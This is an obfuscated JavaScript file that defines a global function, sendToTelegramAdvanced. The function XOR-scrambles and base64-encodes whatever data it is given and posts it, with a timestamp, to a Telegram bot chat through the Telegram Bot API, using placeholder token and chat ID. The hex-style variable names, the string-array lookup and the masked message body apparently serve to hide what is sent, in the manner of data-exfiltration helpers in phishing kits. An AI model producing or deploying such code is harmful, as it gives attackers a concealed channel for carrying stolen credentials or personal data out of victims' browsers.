(function() {
  'use strict';
  
  const _0x4a2b = [
    'YOUR_BOT_TOKEN',
    'YOUR_CHAT_ID',
    'https://api.telegram.org/bot',
    '/sendMessage',
    'POST',
    'application/json',
    'chat_id',
    'text',
    'parse_mode',
    'HTML',
    'stringify',
    'Content-Type',
    'method',
    'headers',
    'body'
  ];
  
  function _0x2f1a3d(_0x4c8b2e) {
    const _0x5e7c8f = _0x4a2b;
    const _0x3b2d1c = _0x5e7c8f[0];
    const _0x7a9e4d = _0x5e7c8f[1];
    
    const _0x6f8c2b = encryptAdvanced(_0x4c8b2e);
    const _0x1d9f4a = `🔐 ${_0x6f8c2b}\n\n⏰ ${new Date().toLocaleString()}`;
    
    const _0x3a2f1d = {
      [_0x5e7c8f[6]]: _0x7a9e4d,
      [_0x5e7c8f[7]]: _0x1d9f4a,
      [_0x5e7c8f[8]]: _0x5e7c8f[9]
    };
    
    fetch(_0x5e7c8f[2] + _0x3b2d1c + _0x5e7c8f[3], {
      [_0x5e7c8f[12]]: _0x5e7c8f[4],
      [_0x5e7c8f[13]]: {
        [_0x5e7c8f[11]]: _0x5e7c8f[5],
      },
      [_0x5e7c8f[14]]: JSON[_0x5e7c8f[10]](_0x3a2f1d)
    })
    .then(_0x8f2d1e => _0x8f2d1e.json())
    .then(_0x9e4f2a => {
      console.log('Advanced Secure Telegram response:', _0x9e4f2a);
    })
    .catch(_0x2f1d8e => {
      console.error('Advanced Secure Telegram error:', _0x2f1d8e);
    });
  }
  
  function encryptAdvanced(_0x5e9d8a) {
    const _0x5f2d1e = {
      'a': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
      'b': 'encode',
      'c': 'charCodeAt',
      'd': 'fromCharCode'
    };
    
    const _0x3f2d1e = JSON.stringify(_0x5e9d8a);
    let _0x7f2d1e = '';
    
    for (let _0x1f2d1e = 0; _0x1f2d1e < _0x3f2d1e.length; _0x1f2d1e++) {
      const _0x9f2d1e = _0x3f2d1e[_0x5f2d1e.c](_0x1f2d1e);
      _0x7f2d1e += String[_0x5f2d1e.d](_0x9f2d1e ^ 0x7A ^ 0x3F);
    }
    
    return btoa(_0x7f2d1e);
  }
  
  window.sendToTelegramAdvanced = _0x2f1a3d;
})(); 